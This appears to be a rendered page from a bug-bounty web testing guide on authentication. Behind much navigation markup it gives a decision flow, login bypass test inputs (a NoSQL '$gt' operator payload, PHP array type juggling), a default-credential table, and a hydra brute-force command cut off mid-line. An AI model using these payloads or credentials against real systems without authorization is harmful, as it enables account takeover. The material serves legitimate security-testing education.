+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-server-cog" viewBox="0 0 24 24"><path d="m10.852 14.772-.383.923M13.148 14.772a3 3 0 1 0-2.296-5.544l-.383-.923M13.148 9.228l.383-.923"/><path d="m13.53 15.696-.382-.924a3 3 0 1 1-2.296-5.544M14.772 10.852l.923-.383M14.772 13.148l.923.383"/><path d="M4.5 10H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v4a2 2 0 0 1-2 2h-.5M4.5 14H4a2 2 0 0 0-2 2v4a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-4a2 2 0 0 0-2-2h-.5M6 18h.01M6 6h.01M9.228 10.852l-.923-.383M9.228 13.148l-.923.383"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../appendices/" class="md-nav__link">
+        
+  
+  
+    <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-file-text" viewBox="0 0 24 24"><path d="M6 22a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h8a2.4 2.4 0 0 1 1.704.706l3.588 3.588A2.4 2.4 0 0 1 20 8v12a2 2 0 0 1-2 2z"/><path d="M14 2v5a1 1 0 0 0 1 1h5M10 9H8M16 13H8M16 17H8"/></svg>
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendices
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  
+                    
+                    
+                    
+                      
+                    
+                    
+                      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+                      <div class="md-sidebar-button__wrapper">
+                        <label class="md-sidebar-button" for="__toc"></label>
+                      </div>
+                    
+                  
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--secondary" aria-label="On this page">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      On this page
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#decision-flow" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Decision Flow
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1 Authentication Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.1 Authentication Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#211-login-logic-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.1 Login Logic Flaws
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#212-default-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.2 Default Credentials
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#213-response-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.1.3 Response Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22-password-reset-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2 Password Reset Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.2 Password Reset Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#221-token-predictability" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.1 Token Predictability
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#222-host-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.2 Host Header Injection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#223-token-reuse-and-expiry" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.3 Token Reuse and Expiry
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#224-username-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.2.4 Username Enumeration
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-jwt-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3 JWT Attacks
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.3 JWT Attacks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#231-algorithm-confusion-rs256-hs256" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.1 Algorithm Confusion (RS256 → HS256)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#232-alg-none-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.2 <code>alg: none</code> Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#233-weak-secret-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.3 Weak Secret Brute-Force
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#234-kid-header-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.4 <code>kid</code> Header Injection
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#235-claim-tampering" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.5 Claim Tampering
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#236-jwt-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.3.6 JWT Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#24-oauth-20-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4 OAuth 2.0 Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.4 OAuth 2.0 Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#241-redirect-uri-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.1 Redirect URI Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#242-state-parameter-bypass-csrf-ato" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.2 State Parameter Bypass (CSRF → ATO)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#243-authorization-code-interception" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.3 Authorization Code Interception
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#244-account-takeover-via-oauth-mislink" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.4 Account Takeover via OAuth Mislink
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#245-oauth-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.4.5 OAuth Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#25-multi-factor-authentication-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5 Multi-Factor Authentication Bypass
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.5 Multi-Factor Authentication Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#251-otp-brute-force" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.1 OTP Brute-Force
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#252-response-manipulation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.2 Response Manipulation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#253-mfa-skip-via-direct-navigation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.3 MFA Skip via Direct Navigation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#254-backup-code-and-recovery-abuse" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.5.4 Backup Code and Recovery Abuse
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#26-session-management" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6 Session Management
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.6 Session Management">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#261-session-fixation" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.1 Session Fixation
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#262-session-not-invalidated-on-logout" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.2 Session Not Invalidated on Logout
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#263-cookie-security-flags" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.3 Cookie Security Flags
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#264-session-token-entropy" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.6.4 Session Token Entropy
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#27-single-sign-on-sso--saml-flaws" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7 Single Sign-On (SSO) / SAML Flaws
+      </span>
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2.7 Single Sign-On (SSO) &#x2f; SAML Flaws">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#271-xml-signature-wrapping-xsw" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.1 XML Signature Wrapping (XSW)
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#272-signature-removal-and-replay" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.2 Signature Removal and Replay
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#273-audience-and-timestamp-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        2.7.3 Audience and Timestamp Bypass
+      </span>
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-complete-checklist" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        Part 2 Complete Checklist
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#references" class="md-nav__link">
+    <span class="md-ellipsis">
+      <span class="md-typeset">
+        References
+      </span>
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+<h1 id="authentication">Authentication<a class="headerlink" href="#authentication" title="Permanent link">&para;</a></h1>
+<p>Authentication is the front door. Session management is the lock on every door inside. Bugs here have the highest direct impact — account takeover, privilege escalation, full application compromise. Always test auth flows manually. Scanners miss most of these.</p>
+<hr />
+<div class="grid cards">
+<ul>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11 7 9.6 8.4l2.6 2.6H2v2h10.2l-2.6 2.6L11 17l5-5zm9 12h-8v2h8c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-8v2h8z"/></svg></span> <strong>2.1 Auth Bypass</strong></p>
+<hr />
+<p>Logic flaws, default credentials, response manipulation. Test before any technical attack.</p>
+<p><a href="#21-authentication-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Start here</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12.63 2c5.53 0 10.01 4.5 10.01 10s-4.48 10-10.01 10c-3.51 0-6.58-1.82-8.37-4.57l1.58-1.25C7.25 18.47 9.76 20 12.64 20a8 8 0 0 0 8-8 8 8 0 0 0-8-8C8.56 4 5.2 7.06 4.71 11h2.76l-3.74 3.73L0 11h2.69c.5-5.05 4.76-9 9.94-9m2.96 8.24c.5.01.91.41.91.92v4.61c0 .5-.41.92-.92.92h-5.53c-.51 0-.92-.42-.92-.92v-4.61c0-.51.41-.91.91-.92V9.23c0-1.53 1.25-2.77 2.77-2.77 1.53 0 2.78 1.24 2.78 2.77zm-2.78-2.38c-.75 0-1.37.61-1.37 1.37v1.01h2.75V9.23c0-.76-.62-1.37-1.38-1.37"/></svg></span> <strong>2.2 Password Reset</strong></p>
+<hr />
+<p>Token predictability, Host header injection, reuse, expiry, enumeration.</p>
+<p><a href="#22-password-reset-flaws"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Reset flaws</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M22 18v4h-4v-3h-3v-3h-3l-2.26-2.26c-.55.17-1.13.26-1.74.26a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6c0 .61-.09 1.19-.26 1.74zM7 5a2 2 0 0 0-2 2 2 2 0 0 0 2 2 2 2 0 0 0 2-2 2 2 0 0 0-2-2"/></svg></span> <strong>2.3 JWT Attacks</strong></p>
+<hr />
+<p>Algorithm confusion, alg:none, weak secrets, kid injection, claim tampering.</p>
+<p><a href="#23-jwt-attacks"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> JWT</a></p>
+</li>
+<li>
+<p>:simple-oauth:{ .lg .middle } <strong>2.4 OAuth 2.0</strong></p>
+<hr />
+<p>Redirect URI bypass, CSRF via missing state, code interception, account mislink.</p>
+<p><a href="#24-oauth-20-flaws"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> OAuth</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 7v2h4v2H4a2 2 0 0 0-2 2v4h6v-2H4v-2h2a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zm7 0v10h2v-4h3v-2h-3V9h4V7zm9 0a2 2 0 0 0-2 2v8h2v-3h2v3h2V9a2 2 0 0 0-2-2zm0 2h2v3h-2z"/></svg></span> <strong>2.5 MFA Bypass</strong></p>
+<hr />
+<p>Rate limit absent, response manipulation, direct navigation, backup code abuse.</p>
+<p><a href="#25-multi-factor-authentication-bypass"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> MFA</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3a9 9 0 0 0-9 9 9 9 0 0 0 9 9 9 9 0 0 0 9-9c0-.5-.04-1-.13-1.5C20.6 10 20 10 20 10h-2V9c0-1-1-1-1-1h-2V7c0-1-1-1-1-1h-1V4c0-1-1-1-1-1M9.5 6A1.5 1.5 0 0 1 11 7.5 1.5 1.5 0 0 1 9.5 9 1.5 1.5 0 0 1 8 7.5 1.5 1.5 0 0 1 9.5 6m-3 4A1.5 1.5 0 0 1 8 11.5 1.5 1.5 0 0 1 6.5 13 1.5 1.5 0 0 1 5 11.5 1.5 1.5 0 0 1 6.5 10m5 1a1.5 1.5 0 0 1 1.5 1.5 1.5 1.5 0 0 1-1.5 1.5 1.5 1.5 0 0 1-1.5-1.5 1.5 1.5 0 0 1 1.5-1.5m5 2a1.5 1.5 0 0 1 1.5 1.5 1.5 1.5 0 0 1-1.5 1.5 1.5 1.5 0 0 1-1.5-1.5 1.5 1.5 0 0 1 1.5-1.5M11 16a1.5 1.5 0 0 1 1.5 1.5A1.5 1.5 0 0 1 11 19a1.5 1.5 0 0 1-1.5-1.5A1.5 1.5 0 0 1 11 16"/></svg></span> <strong>2.6 Session Management</strong></p>
+<hr />
+<p>Fixation, post-logout validity, cookie flags, entropy analysis.</p>
+<p><a href="#26-session-management"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> Sessions</a></p>
+</li>
+<li>
+<p><span class="twemoji lg middle"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5zm0 4a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.13 12A9.7 9.7 0 0 1 12 20.92 9.7 9.7 0 0 1 6.87 17c-.34-.5-.63-1-.87-1.53 0-1.65 2.71-3 6-3s6 1.32 6 3c-.24.53-.53 1.03-.87 1.53"/></svg></span> <strong>2.7 SSO / SAML</strong></p>
+<hr />
+<p>XML signature wrapping, signature removal, audience bypass, timestamp bypass.</p>
+<p><a href="#27-single-sign-on-sso--saml-flaws"><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13.22 19.03a.75.75 0 0 1 0-1.06L18.19 13H3.75a.75.75 0 0 1 0-1.5h14.44l-4.97-4.97a.749.749 0 0 1 .326-1.275.75.75 0 0 1 .734.215l6.25 6.25a.75.75 0 0 1 0 1.06l-6.25 6.25a.75.75 0 0 1-1.06 0"/></svg></span> SAML</a></p>
+</li>
+</ul>
+</div>
+<hr />
+<h2 id="decision-flow">Decision Flow<a class="headerlink" href="#decision-flow" title="Permanent link">&para;</a></h2>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>App uses JWTs for auth?
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>→ Decode immediately. Check alg, check claims. Run 2.3 checklist.
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>App has &quot;Login with Google/GitHub&quot;?
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>→ OAuth flow present. Run 2.4 checklist before anything else.
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>App has enterprise SSO / SAML?
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>→ Install SAML Raider, run all 8 XSW variants.
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>Found admin panel during recon?
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>→ Default credentials first (2.1.2). Takes 2 minutes.
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>MFA present on login?
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>→ Test rate limiting on OTP, test direct navigation past MFA step.
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Time-constrained?
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>→ Auth bypass (2.1) → password reset (2.2) → JWT if tokens present (2.3)
+</span></code></pre></div>
+<hr />
+<h2 id="21-authentication-bypass">2.1 Authentication Bypass<a class="headerlink" href="#21-authentication-bypass" title="Permanent link">&para;</a></h2>
+<h3 id="211-login-logic-flaws">2.1.1 Login Logic Flaws<a class="headerlink" href="#211-login-logic-flaws" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On every login endpoint, before any technical attack. Test the logic first — applications often implement auth checks incorrectly at the code level.</p>
+<p><strong>Tests to run on every login form:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>1. Submit empty credentials → session issued or error?
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>2. Submit valid username + empty password → logs in?
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>3. Submit username with leading/trailing whitespace → matches?
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>4. Submit username as array: username[]=admin&amp;password=x  (PHP type juggling)
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>5. Submit JSON with NoSQL operator:
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>   {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$gt&quot;:&quot;&quot;}}
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>6. Change POST to GET → does login still process?
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>7. Submit with Content-Type: text/plain → still processed?
+</span></code></pre></div>
+<p><strong>Case sensitivity bypass</strong> — many apps store usernames lowercase but compare case-insensitively:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>Admin    ADMIN    admin    admin&lt;space&gt;    admin\n
+</span></code></pre></div>
+<div class="language-bash highlight"><span class="filename">burp_workflow</span><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># 1. Intercept login request</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="c1"># 2. Send to Repeater</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="c1"># 3. Systematically test each variation above</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># Watch for: different response size, different redirect, session cookie issued</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">200 ≠ failure</p>
+<p>Many apps return <code>200 {"success": false}</code>. Always read the full response body — never triage by status code alone on login endpoints.</p>
+</div>
+<div class="admonition tip">
+<p class="admonition-title">Account lockout</p>
+<p>If the program has aggressive lockout, note the threshold first and stay well below it. Locking out real users is out-of-scope behavior.</p>
+</div>
+<hr />
+<h3 id="212-default-credentials">2.1.2 Default Credentials<a class="headerlink" href="#212-default-credentials" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> On any admin panel, internal tool, or third-party component found during recon. Especially common on staging environments.</p>
+<table>
+<thead>
+<tr>
+<th>Service</th>
+<th>Credentials to Try</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Jenkins</td>
+<td><code>admin:admin</code>, <code>admin:password</code>, blank password</td>
+</tr>
+<tr>
+<td>Grafana</td>
+<td><code>admin:admin</code></td>
+</tr>
+<tr>
+<td>Kibana</td>
+<td>No auth by default (pre-7.x)</td>
+</tr>
+<tr>
+<td>phpMyAdmin</td>
+<td><code>root:</code> (empty), <code>root:root</code></td>
+</tr>
+<tr>
+<td>Tomcat Manager</td>
+<td><code>admin:admin</code>, <code>tomcat:tomcat</code>, <code>admin:tomcat</code></td>
+</tr>
+<tr>
+<td>Spring Boot Actuator</td>
+<td>No auth — just access <code>/actuator/env</code></td>
+</tr>
+<tr>
+<td>Jupyter Notebook</td>
+<td>No auth by default</td>
+</tr>
+<tr>
+<td>MongoDB</td>
+<td>No auth by default (older installs)</td>
+</tr>
+<tr>
+<td>Redis</td>
+<td>No auth by default</td>
+</tr>
+<tr>
+<td>Elasticsearch</td>
+<td>No auth by default (pre-8.x)</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash highlight"><span class="filename">default_creds_test.sh</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Manual test first — 5 to 10 combinations, not automated sweeps</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="c1"># Only run hydra if the program explicitly allows credential testing</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>hydra<span class="w"> </span>-l<span class="w"> </span>admin<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span>-P<span class="w"> </span>/opt/SecLists/Passwords/Default-Credentials/default-passwords.txt<span class="w"> </span><span class="se">\</span>
